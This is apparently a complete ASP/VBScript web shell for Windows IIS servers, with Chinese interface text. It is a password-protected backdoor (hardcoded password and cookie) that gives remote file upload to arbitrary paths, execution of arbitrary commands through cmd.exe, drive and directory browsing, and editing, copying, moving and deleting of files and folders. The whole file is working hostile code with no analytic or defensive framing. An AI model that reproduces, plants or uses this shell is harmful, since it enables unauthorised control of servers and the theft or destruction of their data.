<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style>
body{font-family: 宋体;   font-size: 10pt}
table{ font-family: 宋体; font-size: 9pt }
a{ font-family: 宋体; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: 宋体; color: #807123; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
<% if request("up")=1 then %>
<%Server.ScriptTimeOut=5000%>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function
Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
set objForm=Server.CreateObject("Scripting.Dictionary")
set objFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = Server.CreateObject("adodb.stream")
set Data_5xsoft = Server.CreateObject("adodb.stream")
Data_5xsoft.Type = 1
Data_5xsoft.Mode =3
Data_5xsoft.Open
Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
Data_5xsoft.Position=0
RequestData =Data_5xsoft.Read
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iFormStart
Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iInfoEnd
Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_5xsoft.Close
set Data_5xsoft =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType = ""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_5xsoft.position=FileStart
Data_5xsoft.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
SaveAs=false
end function
End Class
</SCRIPT>
<%
dim upload,file,formName,formPath,iCount
set upload=new upload_5xsoft
if upload.form("filepath")="" then
response.write ""
set upload=nothing
response.end
else
formPath=upload.form("filepath")
if right(formPath,1)<>"/" then formPath=formPath&"/"
end if
iCount=0
for each formName in upload.objForm
next
response.write "<br>"
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
file.SaveAs Server.mappath(formPath&file.FileName)
response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" !</center><br>"
iCount=iCount+1
end if
set file=nothing
next
set upload=nothing
response.write "<center>"&iCount&"</center>"
response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'></font></a></center>"
else
url= Request.ServerVariables("URL")
'
if trim(request.form("password"))="yujian47" then
response.cookies("password")="allen"
response.redirect ""&url&""
else if Request.Cookies("password")<>"allen" then
call login()
response.end
end if
select case request("id")
case "edit"
call edit()
case "upload"
call upload()
case "dir"
call dir()
case else
call main()
end select
end if
sub login()
for i=0 to 25
on error resume next
IsObj=false
VerObj=""
dim TestObj
set TestObj=server.CreateObject(ObjTotest(i,0))
If -2147221005 <> Err then
IsObj = True
VerObj = TestObj.version
if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
end if
ObjTotest(i,2)=IsObj
ObjTotest(i,3)=VerObj
next
%>
<body><center>
<table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8">
<tr><td>&nbsp;
</td>
</tr>
</table>
<html>
<body><center>
<table>
<%response.write "<font class=fonts></font>" %>
<%response.write now()%><BR>
<form action="<%= Request.ServerVariables("URL") %>" method="POST">

</form>
</table>
</center>
</body>
</html>
<%
szCMD = Request.Form("text")   '目录浏览
if (szCMD <> "")  then
set shell=server.createobject("shell.application") '建立shell对象
set fod1=shell.namespace(szcmd)
set foditems=fod1.items
for each co in foditems
response.write "<font color=red>" & co.path & "-----" & co.size & "</font><br>"
next
end if
%>

<%
szCMD1 = Request.Form("text1")  '目录拷贝，不能进行文件拷贝
szCMD2 = Request.Form("text2")
if szcmd1<>"" and szcmd2<>"" then
set shell1=server.createobject("shell.application") '建立shell对象
set fod1=shell1.namespace(szcmd2)
for i=len(szcmd1) to 1 step -1
if mid(szcmd1,i,1)="\" then
   path=left(szcmd1,i-1)
   exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(szcmd1,len(szcmd1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command completed success!"
end if
%>

<%
szCMD3 = Request.Form("text3")   '目录移动
szCMD4 = Request.Form("text4")
if szcmd3<>"" and szcmd4<>"" then
set shell2=server.createobject("shell.application") '建立shell对象
set fod1=shell2.namespace(szcmd4)

for i=len(szcmd3) to 1 step -1
if mid(szcmd3,i,1)="\" then
   path=left(szcmd3,i-1)
   exit for
end if
next

if len(path)=2 then path=path & "\"
path2=right(szcmd3,len(szcmd3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
%>
<%
szCMD5 = Request.Form("text5")    '执行程序要指定路径
szCMD6 = Request.Form("text6")
if szcmd5<>"" and szcmd6<>"" then
set shell3=server.createobject("shell.application") '建立shell对象
shell3.namespace(szcmd5).items.item(szcmd6).invokeverb
response.write "command completed success!"
end if
%>


<form method="POST" action=""&url&"">
<input type="password" name="password"size="20">
<input type="submit" value="LOGIN">
</center></form>
</body>
<%end sub%>
<%sub main()
'修改下面的urlpath改为你服务器的实际URL
urlpath="http://localhost"
dim cpath,lpath
set fsoBrowse=CreateObject("Scripting.FileSystemObject")
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%><html>
<script language="JavaScript">
function crfile(ls)
{if (ls==""){alert("请输入文件名!");}
else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{if (ls==""){alert("请输入文件名!");}
else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("你真的要删除这个目录吗!"&Chr(13)&Chr(10)&"目录为："&ls)   then
window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"请输入目标文件的文件名:"&Chr(13)&Chr(10)&"许带路径,要根据你的当前路径模式. 注意:绝对路径示例c:/或c:\都可以")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "对不起，你在相对路径模式下不能使用绝对路径"&Chr(13)&Chr(10)&"错误路径：["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"您没有输入文件名！"
end If
end sub
</script><body bgcolor="#F5F5F5">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0>
<TBODY>
<TR >
<TD
height=22 colspan="4" bgcolor="#eeeeee" >切换盘符：
<%
For Each thing in fsoBrowse.Drives
Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"盘:</a>          "
NEXT
%>   &nbsp;本机局域网地址：
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
%><%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>  </TD>
</TR>  <TD colspan="4" bgcolor="#ffffff" ><%
if Request("attrib")="true"  then
response.write "<a href='"&url&"'><font color='#D00000'>点击切换到相对路径编辑模式</font></a>"
else
response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>点击切换到绝对路径编辑模式</font></a>"
end if
%>绝对路径: <%=cpath%>  &nbsp;&nbsp;当前浏览目录:<%=lpath%></TD></TR> <TR>
<TD height=22 colspan="4" bgcolor="#eeeeee" >
<form name="form1" method="post" action="<%=url%>" >
浏览目录: <input type="text" name="path" size="30" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="浏览目录" > 〖请使用绝对路径,支持局域网地址！〗
</TD></form>
</TR><TR >
<TD colspan="4" bgcolor="#ffffff" ><form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
<input type="hidden" name="act" value="upload">
上传到:
<input name="filepath" type="text" value="/" size="5">
文件地址:
<input type="file" name="file1" value="">
<input type="submit" name="Submit" value="上传文件" > 〖请使用相对路径！〗
</TD>
</form></TR>
<TR bgcolor="#eeeeee">
<TD colspan="4" >
<%
On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
szTempFile = "C:\" & oFileSys.GetTempName( )
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=".CMD" size=40 value="<%= szCMD %>">
<input type=submit value="执行程序" >  〖请使用绝对路径，并且确定你有相应权限！〗
<% If (IsObject(oFile)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
End If %>
</TD> </FORM></TR>
<TR bgColor=#ffffff>
<TD height=22 colspan="4" ><form name="newfile"
onSubmit="return crfile(newfile.filename.value);">
<input type="text" name="filename" size="40">
<input type="submit" value="新建文件" >
<input type="button" value="新建目录"onclick="crdir(newfile.filename.value)">〖新建文件和新建目录不能同名〗
</TD></form>
</TR>
<TR>
<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#eeeeee >
<%
dim theFolder,theSubFolders
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>■</font>↑<font color='ff2222'>回上级目录</font></a><br>"
For Each x In theSubFolders
Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>└<font color='#FF8000'>■</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >×</font>删除</a><br>"
Next
end if
%>
</TD>
<TD  width="45%"  bgColor=#eeeeee>文件名 （鼠标移到文件名可以查看给文件的属性）</TD>
<TD width="11%" bgColor=#eeeeee>大小（字节）</TD>
<TD width="18%" bgColor=#eeeeee>文件操作</TD>
</TR>
<TR>
<TD height=200 colspan="3" valign="top" bgColor=#ffffff>
<%
dim theFiles
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table border='0' width='100%' cellpadding='0'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<strong>"&x.Name&"</strong>"
else
showstring="<a href='"&urlpath&lpath&x.Name&"' title='"&"类型"&x.type&chr(10)&"属性"&x.Attributes&chr(10)&"时间："&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
Response.write"<tr><td width='50%'><font color='#FF8000'>□</font>"&showstring&"</td><td width='8%'>"&x.size&"</a></td><td width='20%'><a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' > &nbsp;编辑</a><a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >&nbsp;&nbsp;删除</a><a href='#' onclick=copyfile('"&lpath&x.Name&"')>&nbsp;&nbsp;复制</a></td></tr>"
Next
end if
Response.write"</table>"
%>
</TD>
</TR></TBODY>
</TABLE>
<% end sub
sub edit()
if request("op")="del"  then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<br><center>删除成功！要刷新才能看到效果.</center>"
else
if request("op")="copy" then
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<center><p>源文件："+whichfile+"</center>"
Response.write "<center><br>目的文件："+dsfile+"</center>"
Response.write "<center><br>复制成功！要刷新才能看到效果!</p></center>"
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.OpenTextFile(whichfile, 1, False)
counter=0
thisline=thisfile.readall
thisfile.Close
set fs=nothing
end if
%>
<form method="POST" action=""&url&"?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
<br>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0>
<TBODY>
<TR >
<TD
height=22 bgcolor="#eeeeee" ><div align="center"></div></TD>
</TR>
<TR >
<TD width="100%"
height=22 bgcolor="#ffffff" >文件名：
<input type="text" name="path" size="45"
value="<%=Request("path")%>"readonly>
</TD>
</TR>
<TR>
<TD
height=22 bgcolor="#eeeeee" > <div align="center">
<textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
</div></TD>
</TR>
<TR>
<TD
height=22 bgcolor="#ffffff" ><div align="center">
<input type="submit"
value="提交" name="B1">
<input type="reset" value="复原" name="B2">
</div></TD>
</TR>
</TABLE>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile=fs.CreateTextFile(whichfile)
outfile.WriteLine Request("text")
outfile.close
set fs=nothing
Response.write "<center>修改成功！要刷新才能看到效果!</center>"
end if
end if
end if
end sub
end if
%>
<% sub dir()
if request("op")="del"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.DeleteFolder whichdir,True
Response.write "<center>删除成功！要刷新才能看到效果，删除的目录为:<b>"&whichdir&"</b></center>"
else
if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.CreateFolder whichdir
Response.write "<center>建立成功！要刷新才能看到效果,建立的目录为:<b>"&whichdir&"</b></center>"
end if
end if
end sub
%>
<br>
<CENTER><br>
</CENTER> </CENTER>
</body>
</html>